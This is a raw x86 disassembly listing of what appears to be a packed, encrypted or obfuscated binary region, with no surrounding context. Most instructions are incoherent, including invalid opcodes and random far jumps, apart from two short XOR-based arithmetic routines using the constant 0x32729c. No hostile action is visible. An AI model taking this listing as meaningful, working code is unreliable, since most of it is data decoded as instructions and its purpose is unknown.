  411225:	xchg   BYTE PTR ds:0x42e20a2d,dl
  41122b:	in     al,0x92
  41122d:	xor    ecx,DWORD PTR ds:0x51858b5c
  411233:	mov    ecx,0x175f9d1f
  411238:	mov    eax,0x476bc65d
  41123d:	push   esi
  41123e:	and    ch,al
  411240:	sbb    DWORD PTR [edi],0x81206a36
  411246:	mov    dl,0x15
  411248:	push   ebx
  411249:	les    ebp,FWORD PTR [ecx+0xa79985b]
  41124f:	fimul  WORD PTR [edx+0x35]
  411252:	mov    ch,BYTE PTR [ebx-0x4b9088e6]
  411258:	cmp    BYTE PTR [ebx-0x60f701d4],0x73
  41125f:	sub    BYTE PTR [eax],ah
  411261:	push   es
  411262:	xchg   DWORD PTR [ebp-0x7a],edx
  411265:	out    dx,eax
  411266:	aaa    
  411267:	adc    DWORD PTR [edx],0xd5616a4d
  41126d:	pop    esi
  41126e:	pushf  
  41126f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411270:	ret    
  411271:	sar    dh,cl
  411273:	xor    al,0xda
  411275:	std    
  411276:	pop    DWORD PTR [eax+0x40]
  411279:	out    0x54,eax
  41127b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41127c:	test   BYTE PTR [esi-0x5d84bc8a],cl
  411282:	jp     0x4112f8
  411284:	ins    BYTE PTR es:[edi],dx
  411285:	bound  ebp,QWORD PTR [esi]
  411287:	rol    ebx,0xad
  41128a:	mov    ebp,0xcd532b82
  41128f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411290:	mov    esp,0x39570526
  411295:	and    al,0xbb
  411297:	push   ds
  411298:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411299:	es push ecx
  41129b:	retf   
  41129c:	sub    al,0xc5
  41129e:	jl     0x411228
  4112a0:	lods   eax,DWORD PTR ds:[esi]
  4112a1:	cmp    bh,BYTE PTR [ecx]
  4112a3:	nop
  4112a4:	pop    edx
  4112a5:	ret    0xb6b2
  4112a8:	dec    ebx
  4112a9:	stos   DWORD PTR es:[edi],eax
  4112aa:	xlat   BYTE PTR ds:[ebx]
  4112ab:	push   0xffffffcf
  4112ad:	out    dx,al
  4112ae:	xchg   esp,eax
  4112af:	lods   eax,DWORD PTR ds:[esi]
  4112b0:	packsswb mm6,QWORD PTR [edx+0x7f53240b]
  4112b7:	or     eax,0xffdac059
  4112bc:	pop    esp
  4112bd:	and    BYTE PTR fs:[edx-0x61],ah
  4112c1:	jecxz  0x41124d
  4112c3:	stc    
  4112c4:	dec    eax
  4112c5:	push   eax
  4112c6:	iret   
  4112c7:	in     al,dx
  4112c8:	mov    ebx,0x7726cfc6
  4112cd:	sub    DWORD PTR [eax-0x13],eax
  4112d0:	lahf   
  4112d1:	out    dx,al
  4112d2:	adc    ebp,ebx
  4112d4:	lahf   
  4112d5:	dec    eax
  4112d6:	loop   0x4112e0
  4112d8:	mov    bl,0x48
  4112da:	fs ret 0x3447
  4112de:	sub    eax,0x5e244208
  4112e3:	lock rol DWORD PTR [esi+0x1c],1
  4112e7:	out    dx,al
  4112e8:	pop    edx
  4112e9:	int    0x6c
  4112eb:	shl    ebp,1
  4112ed:	scas   al,BYTE PTR es:[edi]
  4112ee:	int    0x55
  4112f0:	leave  
  4112f1:	mov    BYTE PTR [esi+ebx*8-0xc],ch
  4112f5:	sbb    eax,0x973d78f1
  4112fa:	fimul  WORD PTR [ecx+esi*4+0x12]
  4112fe:	push   edi
  4112ff:	cmp    DWORD PTR [ebp-0x4f],edi
  411302:	idiv   ecx
  411304:	dec    esi
  411305:	mov    bl,0x3e
  411307:	add    BYTE PTR [edi-0x2d8bef07],dh
  41130d:	jle    0x41137a
  41130f:	in     eax,0xcb
  411311:	adc    bl,BYTE PTR [ebx-0x547c33f]
  411317:	fs dec edi
  411319:	dec    esi
  41131a:	push   ebp
  41131b:	jmp    0x2cc8c64e
  411320:	mov    ebp,0x917a9e64
  411325:	mov    esi,0xa1e76b9d
  41132a:	into   
  41132b:	out    0xac,al
  41132d:	test   DWORD PTR [ecx-0x718df64],ebp
  411333:	mov    WORD PTR [ecx],gs
  411335:	mov    bl,0x5e
  411337:	ja     0x41136f
  411339:	mov    ebx,0xb513056a
  41133e:	(bad)  
  411340:	out    0x30,al
  411342:	mov    cs,WORD PTR [ebx*2+0x1963998d]
  411349:	fwait
  41134a:	push   ds
  41134b:	pop    edi
  41134c:	cdq    
  41134d:	push   0xfffffff7
  41134f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411350:	(bad)  
  411352:	inc    DWORD PTR [ebp-0x6abf42c]
  411358:	imul   edi,DWORD PTR [eax],0x70
  41135b:	cmp    ch,BYTE PTR [ebx-0x5bf0ad44]
  411361:	and    eax,0x569e2686
  411366:	pop    ds
  411367:	sub    ah,BYTE PTR [ecx]
  411369:	into   
  41136a:	mov    dl,0xac
  41136c:	loope  0x41137c
  41136e:	push   ecx
  41136f:	push   eax
  411370:	inc    sp
  411372:	aad    0xbe
  411374:	mov    ah,0xd1
  411376:	(bad)  
  411377:	into   
  411378:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411379:	jo     0x411346
  41137b:	push   0xcf0d0302
  411380:	add    ch,dh
  411382:	cwde   
  411383:	sub    eax,0x9203b92e
  411388:	xchg   esi,eax
  411389:	outs   dx,BYTE PTR ds:[esi]
  41138a:	ins    BYTE PTR es:[edi],dx
  41138b:	adc    esi,esp
  41138d:	scas   al,BYTE PTR es:[edi]
  41138e:	leave  
  41138f:	ins    BYTE PTR es:[edi],dx
  411390:	add    al,0x9e
  411392:	jl     0x411373
  411394:	jle    0x4113b2
  411396:	ja     0x4113b3
  411398:	push   edx
  411399:	add    DWORD PTR [edi-0x67dbe571],ebp
  41139f:	test   ah,bh
  4113a1:	in     ax,0x8b
  4113a4:	fs out 0xd4,al
  4113a7:	fnsave [esp+ecx*1+0x4e]
  4113ab:	add    BYTE PTR [ecx+0x38],dl
  4113ae:	sub    ecx,ecx
  4113b0:	arpl   sp,ax
  4113b2:	sub    ebx,DWORD PTR [ebx]
  4113b4:	icebp  
  4113b5:	xchg   ebx,eax
  4113b6:	(bad)  
  4113b7:	jg     0x4113b0
  4113b9:	cmp    al,0xbd
  4113bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113bc:	xor    BYTE PTR [eax+0x2f],bl
  4113bf:	cmp    BYTE PTR [edi+0x45ac8a3c],dl
  4113c5:	test   al,0x75
  4113c7:	mov    bh,0xda
  4113c9:	ins    DWORD PTR es:[edi],dx
  4113ca:	dec    edx
  4113cb:	sbb    DWORD PTR [esp+ebx*8+0x63],edx
  4113cf:	call   0xc4d87752
  4113d4:	inc    ecx
  4113d5:	jp     0x4113ec
  4113d7:	(bad)  
  4113d8:	sub    dl,BYTE PTR [ebx+0x19308b73]
  4113de:	lahf   
  4113df:	popf   
  4113e0:	pop    ss
  4113e1:	jbe    0x4113b6
  4113e3:	xchg   BYTE PTR [edx+0x1a613b79],ch
  4113e9:	adc    ch,ah
  4113eb:	pop    ecx
  4113ec:	sub    al,0x7d
  4113ee:	mov    BYTE PTR [ebx-0x66],dl
  4113f1:	cdq    
  4113f2:	mov    ebp,0xe6809137
  4113f7:	data16 (bad) 
  4113f9:	shl    DWORD PTR [edi],1
  4113fb:	xchg   esi,eax
  4113fc:	stc    
  4113fd:	inc    esp
  4113fe:	rol    ah,1
  411400:	pop    edx
  411401:	js     0x411444
  411403:	lea    ecx,fs:[edi-0x57]
  411407:	imul   ecx,DWORD PTR [ebx],0x891c2506
  41140d:	pop    ebx
  41140e:	in     eax,0x2a
  411410:	mov    bl,0xde
  411412:	cmp    DWORD PTR [ebx-0x7d9a6072],edx
  411418:	jl     0x411496
  41141a:	pushf  
  41141b:	test   eax,0xfb197c48
  411420:	and    eax,0x58866b99
  411425:	dec    esp
  411426:	sbb    al,BYTE PTR [esi-0x41dd8809]
  41142c:	mov    bh,0x3
  41142e:	jg     0x41140e
  411430:	and    DWORD PTR [esi],0x74f75e64
  411436:	mov    ebx,0x578715b6
  41143b:	jae    0x411494
  41143d:	sub    BYTE PTR [esi+0x33],ah
  411440:	loopne 0x4113e1
  411442:	lods   al,BYTE PTR ds:[esi]
  411443:	sub    BYTE PTR [ecx-0x6ef45765],0xc1
  41144a:	inc    eax
  41144b:	xor    dh,BYTE PTR [edi-0x4d1cf69e]
  411451:	fdiv   QWORD PTR [eax+0x56]
  411454:	add    al,0xd1
  411456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411457:	outs   dx,BYTE PTR ds:[esi]
  411458:	xor    eax,0xc0369b35
  41145d:	jbe    0x4114a6
  41145f:	pop    es
  411460:	add    cl,bh
  411462:	test   BYTE PTR [eax],0xc8
  411465:	mov    BYTE PTR [edi+0x7eb2810a],bl
  41146b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41146c:	xor    ah,BYTE PTR [edi+0x72]
  41146f:	pop    ebx
  411470:	aad    0x12
  411472:	jne    0x411436
  411474:	push   0x46
  411476:	xchg   ebp,eax
  411477:	inc    esp
  411478:	sub    cl,BYTE PTR [ebx-0x12ebbba4]
  41147e:	loopne 0x411493
  411480:	mov    DWORD PTR [ecx-0x461e3b8e],eax
  411486:	push   fs
  411488:	xchg   ebx,eax
  411489:	outs   dx,BYTE PTR ds:[esi]
  41148a:	or     esp,DWORD PTR [ebp-0x5]
  41148d:	xor    BYTE PTR [eax-0x24],ch
  411490:	addr16 retf 0xb0d
  411494:	test   BYTE PTR [edx+0x362f8970],ah
  41149a:	pop    ecx
  41149b:	jns    0x41144f
  41149d:	xor    DWORD PTR [ebx-0x64],eax
  4114a0:	and    edi,0xffffffd2
  4114a3:	(bad)
  4114a6:	out    dx,al
  4114a7:	jecxz  0x411434
  4114a9:	push   ss
  4114aa:	into   
  4114ab:	sub    al,0xbe
  4114ad:	retf   0x7ee7
  4114b0:	aas    
  4114b1:	outs   dx,BYTE PTR ds:[esi]
  4114b2:	inc    ecx
  4114b3:	aas    
  4114b4:	imul   eax,DWORD PTR [edi],0x19d6413c
  4114ba:	in     eax,0x85
  4114bc:	out    dx,al
  4114bd:	sbb    al,BYTE PTR [ecx-0x7fa0d3a7]
  4114c3:	sub    DWORD PTR [edx],ecx
  4114c5:	and    al,BYTE PTR [ebp-0xdac0e3b]
  4114cb:	dec    esi
  4114cc:	les    esp,FWORD PTR [esi+0x72b76093]
  4114d2:	out    dx,eax
  4114d3:	jle    0x411530
  4114d5:	sbb    edi,ebx
  4114d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114d8:	adc    cl,BYTE PTR [edx]
  4114da:	repz jg 0x4114b2
  4114dd:	push   ebp
  4114de:	dec    esi
  4114df:	pop    eax
  4114e0:	test   BYTE PTR [edx-0x44],bh
  4114e3:	rcr    DWORD PTR [edx+0x195a5ad6],0x80
  4114ea:	or     eax,0xf5c5ce84
  4114ef:	xor    BYTE PTR [eax-0x532429d0],cl
  4114f5:	inc    ebp
  4114f6:	dec    edx
  4114f7:	add    BYTE PTR [edi-0x2e],bh
  4114fa:	adc    BYTE PTR [eax],ah
  4114fc:	mov    ah,0x72
  4114fe:	pop    ecx
  4114ff:	xchg   ebx,eax
  411500:	je     0x4114fb
  411502:	jle    0x411564
  411504:	mov    ds:0xfdd1f064,al
  411509:	and    eax,0x12fcc54e
  41150e:	loopne 0x411510
  411510:	xchg   ecx,eax
  411511:	lock mov eax,edx
  411514:	cmp    al,BYTE PTR [esi]
  411516:	xchg   esi,eax
  411517:	bnd ret 
  411519:	fs jge 0x4114de
  41151c:	repz (bad) 
  41151e:	(bad)  
  41151f:	or     BYTE PTR [ecx+0x572c8ec0],bh
  411525:	xchg   esi,eax
  411526:	fnstsw WORD PTR [eax+0x4586101c]
  41152c:	xor    eax,0x27bc2eba
  411531:	adc    cl,bl
  411533:	inc    edx
  411534:	fadd   st(5),st
  411536:	inc    esp
  411537:	cmp    BYTE PTR [eax-0x405d77f4],al
  41153d:	js     0x4114d2
  41153f:	jmp    0xaf7b:0x6c5efd5f
  411546:	mov    ecx,0x75c35b3d
  41154b:	into   
  41154c:	dec    esp
  41154d:	xchg   BYTE PTR [eax-0x31],bl
  411550:	stos   DWORD PTR es:[edi],eax
  411551:	mov    cl,BYTE PTR [ecx]
  411553:	mov    WORD PTR [ebx+0x437a1506],es
  411559:	xlat   BYTE PTR ds:[ebx]
  41155a:	xor    edi,0x16
  41155d:	pop    edx
  41155e:	mov    ch,BYTE PTR [esp+ebx*4-0x72]
  411562:	imul   ecx,ebx,0x34
  411565:	cmp    ebx,DWORD PTR [edi-0x21]
  411568:	cmp    al,0xb1
  41156a:	pop    ecx
  41156b:	inc    eax
  41156c:	lahf   
  41156d:	in     eax,0x70
  41156f:	in     eax,dx
  411570:	cmp    ecx,ecx
  411572:	ret    0x5f0
  411575:	loop   0x41151b
  411577:	scas   eax,DWORD PTR es:[edi]
  411578:	adc    bh,BYTE PTR [edi-0x100d8af9]
  41157e:	dec    ebx
  41157f:	push   esp
  411580:	push   edi
  411581:	rcl    DWORD PTR [esi-0x3494eb2c],1
  411587:	cmp    esi,0x632cb4c5
  41158d:	pop    ebp
  41158e:	inc    edi
  41158f:	rcr    BYTE PTR [ecx],cl
  411591:	test   al,0x26
  411593:	loope  0x4115ff
  411595:	xchg   ebx,eax
  411596:	or     DWORD PTR [edx-0x6a0a6d4d],ebx
  41159c:	psadbw mm1,QWORD PTR [edx-0xba3b8ed]
  4115a3:	fisubr DWORD PTR [edi+eiz*8+0x77]
  4115a7:	lock (bad) 
  4115a9:	mov    edx,0xdcaee3d4
  4115ae:	cmp    eax,0x3f7f4084
  4115b3:	or     eax,DWORD PTR [edi]
  4115b5:	pop    esp
  4115b6:	jg     0x411551
  4115b8:	mov    al,0x47
  4115ba:	enter  0x29e0,0x30
  4115be:	popa   
  4115bf:	stos   DWORD PTR es:[edi],eax
  4115c0:	outs   dx,DWORD PTR ds:[esi]
  4115c1:	outs   dx,DWORD PTR ds:[esi]
  4115c2:	push   edi
  4115c3:	xchg   edx,eax
  4115c4:	std    
  4115c5:	(bad)  [esi-0x16]
  4115c8:	jnp    0x41161e
  4115ca:	retf   0xea08
  4115cd:	sbb    al,0x93
  4115cf:	stos   DWORD PTR es:[edi],eax
  4115d0:	lods   al,BYTE PTR ds:[esi]
  4115d1:	iret   
  4115d2:	sahf   
  4115d3:	test   al,0x7f
  4115d5:	sub    edi,ecx
  4115d7:	sub    eax,0xd591adbb
  4115dc:	xchg   BYTE PTR [esi-0x38],bh
  4115df:	jecxz  0x411562
  4115e1:	mov    edx,DWORD PTR [ebp+0x14]
  4115e4:	xor    eax,ecx
  4115e6:	add    eax,esi
  4115e8:	imul   eax,DWORD PTR [edx]
  4115eb:	mov    edx,DWORD PTR [ebp-0x4]
  4115ee:	xor    edx,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4115f3:	lea    ecx,[edx+ecx*1+0x32729c]
  4115fa:	cmp    ecx,eax
  4115fc:	jmp    0x4119f0
  411601:	mov    ebx,0x93838448
  411606:	push   ebx
  411607:	mov    ebx,0x78da0248
  41160c:	bound  ebp,QWORD PTR [ebx+ebp*4]
  41160f:	add    edi,0x707040ee
  411615:	dec    ecx
  411616:	jge    0x411688
  411618:	jo     0x4115c5
  41161a:	imul   eax,DWORD PTR [ebx+0x3a],0x32
  41161e:	aas    
  41161f:	pop    esi
  411620:	jo     0x411694
  411622:	aas    
  411623:	retf   
  411624:	add    edx,DWORD PTR [edx-0xcf5ca80]
  41162a:	in     al,0xd8
  41162c:	(bad)  
  41162d:	mov    edx,0x278f4789
  411632:	mov    esp,0x1a3dc6a3
  411637:	je     0x4115d7
  411639:	loop   0x41167f
  41163b:	mov    eax,0xa4d634b2
  411640:	int3   
  411641:	lahf   
  411642:	call   0x9d8a0f26
  411647:	adc    DWORD PTR [ebx+0x31],ecx
  41164a:	lods   al,BYTE PTR ds:[esi]
  41164b:	fs add ch,0xb0
  41164f:	or     dl,BYTE PTR ss:0x16c05f96
  411656:	adc    eax,DWORD PTR [ecx-0x4d]
  411659:	push   esp
  41165a:	mov    cl,0x46
  41165c:	cmp    eax,0x80ae49c2
  411661:	fwait
  411662:	call   0x69886afb
  411667:	jnp    0x41165a
  411669:	add    BYTE PTR [eax-0x7a],0xb7
  41166d:	and    eax,0xca926712
  411672:	inc    eax
  411673:	xor    eax,0x75b91cee
  411678:	xlat   BYTE PTR ds:[ebx]
  411679:	aaa    
  41167a:	and    BYTE PTR [eax-0x10a4638d],0xb0
  411681:	and    BYTE PTR [edi-0x204fa312],al
  411687:	mov    esi,eax
  411689:	pop    esp
  41168a:	add    DWORD PTR [edi-0x42ff4b87],ebp
  411690:	add    DWORD PTR [edx-0x65],ebp
  411693:	jo     0x41163c
  411695:	dec    edx
  411696:	mov    cl,0xcb
  411698:	pop    ebx
  411699:	out    dx,al
  41169a:	jp     0x4116e3
  41169c:	inc    edx
  41169d:	retf   0xd072
  4116a0:	jge    0x411669
  4116a2:	push   ss
  4116a3:	into   
  4116a4:	call   0xe0f82534
  4116a9:	enter  0x1402,0x75
  4116ad:	lock ror BYTE PTR ds:0x5d371d4a,0x90
  4116b5:	lock xchg cl,cl
  4116b8:	in     eax,0x94
  4116ba:	mov    al,0x3e
  4116bd:	dec    esi
  4116be:	lea    edx,[ebx+0x286faabe]
  4116c4:	int    0x84
  4116c6:	addr16 in eax,dx
  4116c8:	ficom  DWORD PTR [edi+0x5]
  4116cb:	cmp    BYTE PTR [ebx+0x38],bl
  4116ce:	jmp    0x411685
  4116d0:	pushf  
  4116d1:	cld    
  4116d2:	xchg   esp,eax
  4116d3:	aaa    
  4116d4:	jne    0x411684
  4116d6:	mov    ebp,0x4b25fa06
  4116db:	and    cl,dh
  4116dd:	in     al,dx
  4116de:	mov    ecx,0x875b398e
  4116e3:	shr    BYTE PTR [edi-0x7a],cl
  4116e6:	outs   dx,BYTE PTR ds:[esi]
  4116e7:	push   ds
  4116e8:	les    edx,FWORD PTR [eax+0x15]
  4116eb:	xchg   edi,eax
  4116ec:	push   es
  4116ed:	xor    DWORD PTR [edi+0x15708ac7],esp
  4116f3:	pushf  
  4116f4:	xchg   BYTE PTR [eax],dh
  4116f6:	add    ah,al
  4116f8:	xchg   ebx,eax
  4116f9:	xor    eax,0x9fdf11c9
  4116fe:	or     ebp,DWORD PTR [esi+0x6959a65a]
  411704:	pop    edi
  411705:	pop    ebp
  411706:	addr16 jp 0x4116fa
  411709:	sub    ebx,DWORD PTR [esp+edx*8-0x17cf13ec]
  411710:	pop    edx
  411711:	pop    ecx
  411712:	stc    
  411713:	and    eax,0x1509deca
  411718:	mov    DWORD PTR [ebx+eiz*1],eax
  41171b:	pushf  
  41171c:	dec    ebx
  41171d:	pop    ebx
  41171e:	sub    bl,bl
  411720:	sub    esi,DWORD PTR [eax-0x32]
  411723:	sbb    ebx,DWORD PTR [ecx]
  411725:	fucomi st,st(0)
  411727:	fist   DWORD PTR [edi+ecx*1]
  41172a:	pushf  
  41172b:	jne    0x411784
  41172d:	push   ds
  41172e:	pop    DWORD PTR [eax+0x12]
  411731:	sub    ah,BYTE PTR [ecx+0x2407d6fd]
  411737:	xor    eax,0x42073146
  41173c:	jmp    0x7f3d:0xe614552e
  411743:	jmp    0xca38:0xf52b05f8
  41174a:	mov    edx,DWORD PTR [esi-0x27]
  41174d:	jne    0x4117c8
  41174f:	mov    WORD PTR [eax-0x31d9e0b3],?
  411755:	popf   
  411756:	pop    ds
  411757:	sar    DWORD PTR [edi],1
  411759:	clc    
  41175a:	les    esp,FWORD PTR [ecx+0x22]
  41175d:	mov    ebp,0x90e612e
  411762:	push   cs
  411763:	mov    al,ds:0x8c04cd0b
  411768:	test   dh,bl
  41176a:	cwde   
  41176b:	add    BYTE PTR [ebx],0xf
  41176e:	sbb    edi,DWORD PTR [ebx]
  411770:	mov    esi,0xeaa96c51
  411775:	mov    ds:0xc28f3327,al
  41177a:	mov    cl,0xd0
  41177c:	mov    eax,ds:0x1b4cf388
  411781:	cs xchg ecx,eax
  411783:	add    BYTE PTR [esp+esi*1],cl
  411786:	dec    edi
  411787:	xchg   ebp,eax
  411788:	mov    cl,0xa7
  41178a:	adc    al,0x2
  41178c:	xlat   BYTE PTR ds:[ebx]
  41178d:	test   DWORD PTR [eax],esi
  41178f:	push   ds
  411790:	mov    edi,0x7e803162
  411795:	and    eax,0xe1e17fde
  41179a:	add    dl,dh
  41179c:	ins    BYTE PTR es:[edi],dx
  41179d:	sub    esp,DWORD PTR [edi+0x138b966]
  4117a3:	clc    
  4117a4:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4117a6:	shr    bl,0x16
  4117a9:	dec    edi
  4117aa:	add    BYTE PTR [ebp-0x7fe7d346],bl
  4117b0:	add    DWORD PTR [edi-0x6aa99a77],esp
  4117b6:	loop   0x4117fb
  4117b8:	mov    cl,0x94
  4117ba:	sti    
  4117bb:	ret    
  4117bc:	fild   DWORD PTR [eax-0x2f]
  4117bf:	and    bh,cl
  4117c1:	clc    
  4117c2:	out    dx,al
  4117c3:	ret    0xad
  4117c6:	(bad)  
  4117c8:	mov    ebp,0xd8699256
  4117cd:	ss leave 
  4117cf:	ins    DWORD PTR es:[edi],dx
  4117d0:	test   DWORD PTR [eax-0x39],ebp
  4117d3:	inc    ebx
  4117d4:	and    DWORD PTR [eax+ecx*2],esp
  4117d7:	cli    
  4117d8:	and    eax,0x83d4ad0f
  4117dd:	mov    bl,0xe5
  4117df:	xchg   ecx,ecx
  4117e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117e2:	push   esp
  4117e3:	(bad)  
  4117e4:	loop   0x41177f
  4117e6:	(bad)  
  4117e7:	aas    
  4117e8:	fldenv [ebp+esi*1+0x160c04ed]
  4117ef:	mov    ah,0x41
  4117f1:	xchg   edx,eax
  4117f2:	mov    eax,ds:0x2efef6ad
  4117f7:	sbb    eax,0x3d26c53a
  4117fc:	clc    
  4117fd:	popf   
  4117fe:	mov    dh,0xbd
  411800:	or     DWORD PTR ds:0xc3a1b4f8,esi
  411806:	into   
  411807:	lods   al,BYTE PTR ds:[esi]
  411808:	xor    eax,0x8d0e58c7
  41180d:	arpl   WORD PTR [ebp+0x57],bp
  411810:	into   
  411811:	mov    ch,0xb
  411813:	je     0x411880
  411815:	aas    
  411816:	je     0x4117d2
  411818:	jmp    0x411848
  41181a:	jmp    0x411883
  41181c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41181d:	pop    esp
  41181e:	seto   BYTE PTR [ebx+0x2d5e111]
  411825:	call   0xdc13:0x7574cc9c
  41182c:	arpl   WORD PTR [edi+0x3784fe39],ax
  411832:	jl     0x4118ac
  411834:	pop    eax
  411835:	pop    ds
  411836:	pop    ebx
  411837:	sbb    eax,0xdcbac3b0
  41183c:	stc    
  41183d:	jo     0x411886
  41183f:	xchg   esi,eax
  411840:	popa   
  411841:	pushf  
  411842:	div    BYTE PTR [edi]
  411844:	push   0x37
  411846:	cmc    
  411847:	icebp  
  411848:	les    ecx,FWORD PTR [eax-0x2c]
  41184b:	dec    esp
  41184c:	cmc    
  41184d:	inc    edx
  41184e:	mov    esi,0x18c42781
  411853:	cmp    al,0xb5
  411855:	add    BYTE PTR [esi+0x5948c2e1],dh
  41185b:	imul   ecx,ebp,0xffffff8c
  41185e:	pusha  
  41185f:	std    
  411860:	mov    ch,BYTE PTR [ecx]
  411862:	or     al,0x37
  411864:	fstp   DWORD PTR [ebx-0x68]
  411867:	xor    al,0xf6
  411869:	das    
  41186a:	rol    DWORD PTR [eax+0x9],cl
  41186d:	lea    esp,[esi+eiz*1+0x10]
  411871:	int    0xb3
  411873:	push   esi
  411874:	nop
  411875:	mov    ch,0x8e
  411877:	adc    bl,ah
  411879:	lock inc ebp
  41187b:	pop    ebx
  41187c:	xor    eax,0xe817a66b
  411881:	pop    edi
  411882:	xor    DWORD PTR [edx+0x22f540b4],esp
  411888:	push   edi
  411889:	pusha  
  41188a:	xor    eax,0x1e30646
  41188f:	mov    esi,0xf173a071
  411894:	mov    esp,0x62c28726
  411899:	inc    ecx
  41189a:	(bad)  
  41189b:	cmp    eax,0xf1493473
  4118a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118a1:	popa   
  4118a2:	fisttp WORD PTR [edi+0x79]
  4118a5:	in     al,0xf4
  4118a7:	in     eax,0xb2
  4118a9:	retf   
  4118aa:	cli    
  4118ab:	pop    ebx
  4118ac:	scas   eax,DWORD PTR es:[edi]
  4118ad:	push   ss
  4118ae:	mov    ebx,0x34975f39
  4118b3:	cli    
  4118b4:	(bad)  
  4118b5:	jo     0x411863
  4118b7:	xor    DWORD PTR [esp+ecx*2-0x52391cd1],esi
  4118be:	xchg   edx,eax
  4118bf:	adc    BYTE PTR es:[eax-0x3c],cl
  4118c3:	pop    edx
  4118c4:	stc    
  4118c5:	ds fs mov eax,0xe1827ffe
  4118cc:	popf   
  4118cd:	fcmovnb st,st(3)
  4118cf:	ror    BYTE PTR [eax+ebp*8-0x675f1fcf],cl
  4118d6:	xlat   BYTE PTR cs:[ebx]
  4118d8:	daa    
  4118d9:	out    0x1b,al
  4118db:	int3   
  4118dc:	xor    BYTE PTR [ebp+0x23a6eb4f],ch
  4118e2:	xor    ch,BYTE PTR [ebp-0x39]
  4118e5:	xor    al,0x27
  4118e7:	mov    esp,0xecc8b55b
  4118ec:	daa    
  4118ed:	loopne 0x4118c5
  4118ef:	mov    edx,0x5d6bb73e
  4118f4:	pop    edi
  4118f5:	jmp    0xe9c6410e
  4118fa:	cmp    al,0x3f
  4118fc:	clc    
  4118fd:	mov    bh,0x4b
  4118ff:	clc    
  411900:	imul   ecx,DWORD PTR es:[edi-0x3],0x3c653f84
  411908:	icebp  
  411909:	jnp    0xb1938556
  41190f:	sub    BYTE PTR [edx],cl
  411911:	retf   
  411912:	jle    0x4118c3
  411914:	sub    edi,DWORD PTR [edx]
  411916:	mov    WORD PTR [eax-0x62],fs
  411919:	pushf  
  41191a:	or     ebx,esi
  41191c:	mov    ds:0x972a20e5,eax
  411921:	xlat   BYTE PTR ds:[ebx]
  411922:	cmp    dl,BYTE PTR [ecx+eax*1-0x5ebfaad]
  411929:	pop    es
  41192a:	sbb    al,0x71
  41192c:	ror    BYTE PTR [ecx-0x6c],1
  41192f:	call   0x6a78ced7
  411934:	and    DWORD PTR [edx+0x7111b6],ebx
  41193a:	movsx  ebx,WORD PTR [edx-0x2bc9c647]
  411941:	add    al,BYTE PTR [edi+eiz*4-0x64b5e198]
  411948:	or     esi,DWORD PTR [edx-0x48]
  41194b:	repnz ficom DWORD PTR [edi]
  41194e:	jle    0x4118e4
  411950:	std    
  411951:	xchg   ebx,eax
  411952:	das    
  411953:	fidivr DWORD PTR [edx+eax*2]
  411956:	gs cs pop es
  411959:	xor    dh,BYTE PTR [eax+0x44ffcbfc]
  41195f:	xchg   edx,eax
  411960:	jp     0x411985
  411962:	shl    BYTE PTR [edi],cl
  411964:	pop    edx
  411965:	repz mov eax,esi
  411968:	and    edi,DWORD PTR [esi+eiz*2]
  41196b:	sub    BYTE PTR [ebx+edi*8+0x22],dh
  41196f:	adc    BYTE PTR ds:0xe824b861,0xe8
  411976:	push   esi
  411977:	or     DWORD PTR [edx-0x7f914ab2],esp
  41197d:	scas   eax,DWORD PTR es:[edi]
  41197e:	mov    al,ds:0x93df67
  411983:	push   ebx
  411984:	cld    
  411985:	or     dh,BYTE PTR [ecx]
  411987:	push   ss
  411988:	jne    0x411950
  41198a:	push   es
  41198b:	adc    esp,DWORD PTR [edx]
  41198d:	or     ah,ch
  41198f:	lods   al,BYTE PTR ds:[esi]
  411990:	andps  xmm0,xmm7
  411993:	in     al,dx
  411994:	mov    bl,0x4f
  411996:	ss repnz cli 
  411999:	ds or  edi,ecx
  41199c:	in     al,dx
  41199d:	fs xor cl,cl
  4119a0:	jo     0x411967
  4119a2:	ret    
  4119a3:	scas   eax,DWORD PTR es:[edi]
  4119a4:	daa    
  4119a5:	or     BYTE PTR [edx-0x7cb35a94],dl
  4119ab:	nop
  4119ac:	push   ebx
  4119ad:	iret   
  4119ae:	dec    eax
  4119af:	push   ds
  4119b0:	ss adc ch,ch
  4119b3:	dec    esi
  4119b4:	leave  
  4119b5:	lock push 0x2e
  4119b8:	fstp   QWORD PTR [esi+0x77564b34]
  4119be:	xchg   ecx,eax
  4119bf:	lock icebp 
  4119c1:	inc    edi
  4119c2:	int    0xc6
  4119c4:	cdq    
  4119c5:	dec    edx
  4119c6:	xchg   ah,dl
  4119c8:	icebp  
  4119c9:	lea    eax,[edx]
  4119cb:	or     al,0x5
  4119cd:	loop   0x411970
  4119cf:	xchg   ecx,eax
  4119d0:	aaa    
  4119d1:	inc    ecx
  4119d2:	into   
  4119d3:	popa   
  4119d4:	out    dx,eax
  4119d5:	pop    eax
  4119d6:	rol    BYTE PTR [esi+edx*1-0x4d8fc4c],1
  4119dd:	or     BYTE PTR [ebx+0x1422c995],bl
  4119e3:	push   ss
  4119e4:	out    dx,al
  4119e5:	push   edx
  4119e6:	jp     0x411a1b
  4119e8:	add    DWORD PTR [ebx],esp
  4119ea:	fwait
  4119eb:	loopne 0x4119e7
  4119ed:	ror    BYTE PTR [ebx-0x397af057],0xef
  4119f4:	(bad)  
  4119f5:	dec    DWORD PTR [ebx+0x5e9de]
  4119fb:	add    BYTE PTR [eax],al
  4119fd:	mov    ebx,0x32729c
  411a02:	mov    eax,DWORD PTR [ebp-0x4]
  411a05:	xor    eax,0x7510855
  411a0a:	add    eax,ebx
  411a0c:	mov    DWORD PTR [ebp-0xc],eax
  411a0f:	xor    ebx,ebx
